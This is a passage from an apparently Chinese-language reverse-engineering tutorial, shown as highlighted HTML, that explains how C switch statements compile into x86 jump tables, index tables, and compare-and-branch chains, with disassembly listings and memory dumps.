class=\"function\">$L539:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D841 <span class=\"number\">68</span> B4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;4&quot;</span> (<span class=\"number\">00422f</span>b4)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D846 E8 F5 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84B <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84E EB <span class=\"number\">67</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L541:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D850 <span class=\"number\">68</span> <span class=\"number\">64</span> <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;5&quot;</span> (<span class=\"number\">00422f</span>64)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D855 E8 E6 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85A <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85D EB <span class=\"number\">58</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L543:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85F <span class=\"number\">68</span> <span class=\"number\">3</span>C <span class=\"number\">21</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;6&quot;</span> (<span class=\"number\">0042213</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D864 E8 D7 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D869 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86C EB <span class=\"number\">49</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L545:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86E <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;7&quot;</span> (<span class=\"number\">0042202</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D873 E8 C8 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D878 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D87B EB <span class=\"number\">3</span>A                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L547:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D87D <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;8&quot;</span> (<span class=\"number\">00422028</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D882 E8 B9 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D887 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D88A EB <span class=\"number\">2B</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L549:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D88C <span class=\"number\">68</span> <span class=\"number\">24</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;9&quot;</span> (<span class=\"number\">00422024</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D891 E8 AA <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D896 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D899 EB <span class=\"number\">1</span>C                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L551:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D89B <span class=\"number\">68</span> <span class=\"number\">20</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;A&quot;</span> (<span class=\"number\">00422020</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A0 E8 <span class=\"number\">9B</span> <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A5 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A8 EB <span class=\"number\">0</span>D                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8AA <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;sb&quot;</span> (<span class=\"number\">0042201</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8AF E8 <span class=\"number\">8</span>C <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B4 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B7 <span class=\"number\">5F</span>                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B8 <span class=\"number\">5</span>E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B9 <span class=\"number\">5B</span>                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8BA <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8BD <span class=\"number\">3B</span> EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8BF E8 FC <span class=\"number\">38</span> FF FF       call        __chkesp (<span class=\"number\">004011</span>c0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C4 <span class=\"number\">8B</span> E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C6 <span class=\"number\">5</span>D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C7 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C8  <span class=\"number\">0</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8CC  <span class=\"number\">20</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>   谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8D0  <span class=\"number\">32</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  <span class=\"number\">2</span>谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8D4  <span class=\"number\">41</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  A谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8D8  <span class=\"number\">50</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  P谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8DC  <span class=\"number\">5F</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  _谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8E0  <span class=\"number\">6</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  n谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8E4  <span class=\"number\">7</span>D D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  &#125;谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8E8  <span class=\"number\">8</span>C D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  屫@.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8EC  <span class=\"number\">9B</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  涁@.</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">//case不连续且差值不大</span></span><br><span class=\"line\"><span class=\"function\">//如果中间出现不连续的case会用default补大表空缺 </span></span><br><span class=\"line\"><span class=\"function\">//空缺的地方会用case补，下面的两个<span class=\"number\">0040</span>D886</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A4  <span class=\"number\">0</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A8  <span class=\"number\">86</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  嗀@.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8AC  <span class=\"number\">86</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  嗀@.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B0  <span class=\"number\">1</span>D D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B4  <span class=\"number\">2</span>C D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  ,谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B8  <span class=\"number\">3B</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  ;</span>谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8BC  <span class=\"number\">4</span>A D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  J谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8C0  <span class=\"number\">59</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  Y谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8C4  <span class=\"number\">68</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  h谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8C8  <span class=\"number\">77</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  w谸.</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如果case不连续且差值过大 使用大表加小表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">301</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">308</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;8&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">309</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;9&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">310</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sb&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D0 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D1 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D3 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D6 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D7 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D8 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D9 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E1 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E6 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E8 <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EB <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EE <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F1 <span class=\"number\">81</span> E9 <span class=\"number\">2</span>D <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span>    sub         ecx,<span class=\"number\">12</span>Dh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F7 <span class=\"number\">89</span> <span class=\"number\">4</span>D FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7FA <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">09</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FE <span class=\"number\">77</span> <span class=\"number\">4</span>E                ja          $L539+<span class=\"number\">0F</span>h (<span class=\"number\">0040</span>d84e)</span><br><span class=\"line\"><span class=\"number\">0040</span>D800 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D803 <span class=\"number\">33</span> D2                <span class=\"keyword\">xor</span>         edx,edx</span><br><span class=\"line\"><span class=\"number\">0040</span>D805 <span class=\"number\">8</span>A <span class=\"number\">90</span> <span class=\"number\">80</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>    mov         dl,<span class=\"function\">byte <span class=\"title\">ptr</span>  <span class=\"params\">(<span class=\"number\">0040</span>d880)</span>[eax]   <span class=\"comment\">//内存0040d880中偏移量为[eax]的值</span></span></span><br><span class=\"line\"><span class=\"function\">0040D80B FF 24 95 6C D8 40 00 jmp         dword ptr [edx*4+40D86Ch]</span></span><br><span class=\"line\"><span class=\"function\">$L533:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D812 <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">0042202</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D817 E8 <span class=\"number\">24</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D81C <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D81F EB <span class=\"number\">3</span>A                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\">$L535:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D821 <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;8&quot;</span> (<span class=\"number\">00422028</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D826 E8 <span class=\"number\">15</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82B <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82E EB <span class=\"number\">2B</span>                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\">$L537:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D830 <span class=\"number\">68</span> <span class=\"number\">24</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;9&quot;</span> (<span class=\"number\">00422024</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D835 E8 <span class=\"number\">06</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83A <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83D EB <span class=\"number\">1</span>C                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\">$L539:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83F <span class=\"number\">68</span> <span class=\"number\">20</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;A&quot;</span> (<span class=\"number\">00422020</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D844 E8 F7 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D849 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84C EB <span class=\"number\">0</span>D                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84E <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;sb&quot;</span> (<span class=\"number\">0042201</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D853 E8 E8 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D858 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85B <span class=\"number\">5F</span>                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85C <span class=\"number\">5</span>E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85D <span class=\"number\">5B</span>                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85E <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D861 <span class=\"number\">3B</span> EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D863 E8 <span class=\"number\">58</span> <span class=\"number\">39</span> FF FF       call        __chkesp (<span class=\"number\">004011</span>c0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D868 <span class=\"number\">8B</span> E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86A <span class=\"number\">5</span>D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86B C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86C  <span class=\"number\">12</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D870  <span class=\"number\">21</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  !谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D874  <span class=\"number\">30</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  <span class=\"number\">0</span>谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D878  <span class=\"number\">3F</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  ?谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D87C  <span class=\"number\">4</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  N谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D880  <span class=\"number\">00</span> <span class=\"number\">04</span> <span class=\"number\">04</span> <span class=\"number\">04</span>  ....</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D884  <span class=\"number\">04</span> <span class=\"number\">04</span> <span class=\"number\">04</span> <span class=\"number\">01</span>  ....</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D888  <span class=\"number\">02</span> <span class=\"number\">03</span> CC CC  ..烫</span></span><br><span class=\"line\"><span class=\"function\">//中间的<span class=\"number\">04</span>就是代替大表中的default</span></span><br><span class=\"line\"><span class=\"function\">//如果空缺的太多会生成一张小表来替代大表中default填充，变为大表加小表</span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">//差值过大</span></span><br><span class=\"line\"><span class=\"function\">void func(int x)</span></span><br><span class=\"line\"><span class=\"function\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">1301</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">5308</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;8&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">10309</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;9&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">20310</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sb&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D0 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D1 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D3 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D6 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D7 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D8 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D9 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E1 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E6 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E8 <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EB <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EE <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">45</span> <span class=\"number\">28</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2845</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F5 <span class=\"number\">7F</span> <span class=\"number\">1</span>D                jg          func+<span class=\"number\">44</span>h (<span class=\"number\">0040</span>d814)</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F7 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">45</span> <span class=\"number\">28</span> <span class=\"number\">00</span> <span class=\"number\">00</span> cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">2845</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7FE <span class=\"number\">74</span> <span class=\"number\">3</span>D                je          func+<span class=\"number\">6</span>Dh (<span class=\"number\">0040</span>d83d)</span><br><span class=\"line\"><span class=\"number\">0040</span>D800 <span class=\"number\">81</span> <span class=\"number\">7</span>D FC <span class=\"number\">15</span> 